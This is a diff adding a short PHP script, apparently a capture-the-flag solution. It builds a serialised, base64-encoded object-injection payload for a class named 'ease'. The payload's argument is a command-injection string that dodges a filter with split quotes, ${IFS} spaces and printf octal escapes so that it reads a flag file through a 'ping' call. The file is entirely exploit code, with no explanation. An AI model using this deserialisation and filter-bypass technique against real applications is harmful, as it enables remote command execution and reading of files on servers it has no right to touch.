@@ -1,0 +1,27 @@
+<?php
+
+class ease{
+    
+    private $method;
+    private $args;
+    function __construct($method, $args) {
+        $this->method = $method;
+        $this->args = $args;
+    }
+ 
+    function __wakeup(){
+        foreach($this->args as $k => $v) {
+            $this->args[$k] = $this->waf($v);
+        }
+    }   
+}
+
+$args=array('ca""t${IFS}f""lag_1s_here$(printf${IFS}"\57")f""lag_831b69012c67b35f.p""hp');
+$a=new ease("ping",$args);
+$b=serialize($a);
+print($b."\n");
+$data=base64_encode($b);
+echo $data;
+
+
+?>
